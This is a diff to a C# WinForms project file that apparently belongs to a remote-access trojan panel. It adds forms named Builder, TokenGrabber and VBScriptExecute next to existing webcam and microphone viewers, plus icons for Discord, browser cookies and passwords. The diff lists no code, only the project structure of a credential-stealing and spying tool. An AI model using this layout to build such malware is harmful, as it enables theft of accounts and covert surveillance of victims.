@@ -40,6 +40,9 @@
     <Reference Include="Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d, processorArchitecture=MSIL">
       <HintPath>packages\Costura.Fody.6.0.0\lib\netstandard2.0\Costura.dll</HintPath>
     </Reference>
+    <Reference Include="FastColoredTextBox, Version=2.16.24.0, Culture=neutral, PublicKeyToken=fb8aa12b994ef61b, processorArchitecture=MSIL">
+      <HintPath>packages\FCTB.2.16.24\lib\FastColoredTextBox.dll</HintPath>
+    </Reference>
     <Reference Include="Guna.Charts.WinForms, Version=1.1.0.0, Culture=neutral, PublicKeyToken=8b9d14aa5142e261, processorArchitecture=MSIL">
       <HintPath>packages\Guna.Charts.WinForms.1.1.0\lib\net48\Guna.Charts.WinForms.dll</HintPath>
     </Reference>
@@ -122,6 +125,18 @@
     <Compile Include="Classes\Extra\MessageHandler.cs" />
     <Compile Include="Classes\Global.cs" />
     <Compile Include="Classes\LazyServer.cs" />
+    <Compile Include="Forms\Builder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Builder.Designer.cs">
+      <DependentUpon>Builder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\Chat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Chat.Designer.cs">
+      <DependentUpon>Chat.cs</DependentUpon>
+    </Compile>
     <Compile Include="Forms\MicViewer.cs">
       <SubType>Form</SubType>
     </Compile>
@@ -147,6 +162,18 @@
     <Compile Include="Forms\Sweep.Designer.cs">
       <DependentUpon>Sweep.cs</DependentUpon>
     </Compile>
+    <Compile Include="Forms\TokenGrabber.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\TokenGrabber.Designer.cs">
+      <DependentUpon>TokenGrabber.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\VBScriptExecute.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\VBScriptExecute.Designer.cs">
+      <DependentUpon>VBScriptExecute.cs</DependentUpon>
+    </Compile>
     <Compile Include="Forms\WebcamViewer.cs">
       <SubType>Form</SubType>
     </Compile>
@@ -154,6 +181,12 @@
       <DependentUpon>WebcamViewer.cs</DependentUpon>
     </Compile>
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <EmbeddedResource Include="Forms\Builder.resx">
+      <DependentUpon>Builder.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\Chat.resx">
+      <DependentUpon>Chat.cs</DependentUpon>
+    </EmbeddedResource>
     <EmbeddedResource Include="Forms\MicViewer.resx">
       <DependentUpon>MicViewer.cs</DependentUpon>
     </EmbeddedResource>
@@ -165,6 +198,12 @@
     </EmbeddedResource>
     <EmbeddedResource Include="Forms\Sweep.resx">
       <DependentUpon>Sweep.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\TokenGrabber.resx">
+      <DependentUpon>TokenGrabber.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\VBScriptExecute.resx">
+      <DependentUpon>VBScriptExecute.cs</DependentUpon>
     </EmbeddedResource>
     <EmbeddedResource Include="Forms\WebcamViewer.resx">
       <DependentUpon>WebcamViewer.cs</DependentUpon>
@@ -245,6 +284,27 @@
   </ItemGroup>
   <ItemGroup>
     <None Include="Resources\toolbox.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\key-chain.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\discord.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cookies.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\password.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\wscript_101.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\icons8-microsoft-edge-96.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\chrome.png" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
